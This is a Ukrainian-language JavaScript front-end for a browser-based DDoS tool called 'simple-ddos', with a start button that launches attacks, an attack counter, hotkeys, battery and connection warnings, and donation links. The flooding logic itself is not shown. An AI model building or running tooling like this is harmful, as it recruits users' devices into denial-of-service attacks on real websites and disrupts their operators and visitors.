/**База данних (`localStorage`)*/
const Database = localStorage;

!Database.attacks && Database.attacks = 0;


/**
 * Звукові ефекти **(SFX)**
 * 
 * - click
 * 
 * ---
 * Всі звукові файли в форматі **MP3**
 */
const sounds = {
    click: new Audio("sounds/click.mp3")
};


$(async () => {
    /*
    Кхм. Зарплата прийшла?
    Тоді можеш задонатити на ЗСУ прямо зараз - <https://uahelp.monobank.ua>

    Дякую!
    */

    Doser = new Doser(); // Ініціалізація воркера

    $("#button").click(/**Старт атаки*/
        () => Doser.go()
    );

    $("#attacks-section").click(/** Загальна кількість атак*/
        () => 
        swal("Атаки",
            `Взагалом атаковано: <b>${Database.attacks}</b>`,
            "info"
        )
    );

    $("#help-ukraine").click(() => HUWWidget.show());


    // Якщо на сайт заходять з інтернету
    if (window.location.protocol != 'file:') {
        if (navigator.onLine){
            // Якщо заслабкий інтернет
            if (
                !['3g', '4g', '5g'].includes(navigator.connection.effectiveType)
                ) {
                swal("Зауваження",
                    "У вас заслабкий інтернет!\nДля ефективної атаки - підключіться до WI-FI",
                    "warning"
                )
            }
        } else swal("Помилка",
                    "Немає підключення до інтернету!",
                    "error"
                )
    }

    $(window).on({
        /**
         * Гарячі клавіші
         * @param {Event} e Подія
         */
        keyup(e) {
            switch (e.keyCode) {
                case 19 || 35:
                    Doser.attack && Doser.stop();
                    break;
                
                case 115:
                    Doser.go();
                    break;
            }
        }
    })


    // Фішечки

    const battery = await navigator.getBattery()

    battery.onlevelchange = e => {
        if (!e.target.charging) {

            const level = e.target.level * 100
        
            switch (level) {
                case 15:
                    swal("Увага!", "У вас сідає батарея (залишилось 15%)", "warning");
                    break;

                case 10:
                    swal("Увага!",
                        "Критично низький заряд батареї, атаку буде вимкнено\n\
                        Просимо поставити телефон на зарядку", 

                        "warning").then(() => Doser.attack && Doser.stop());
                    break;
            }
        }
    };

    console.log(
        '%cЯкщо ти розробник - можеш допомогти проекту\nhttps://github.com/BogdanDevUA/simple-ddos',
        'font-size:20px;font-family:"Comic Sans MS"'
    )
})
// Слава Україні!
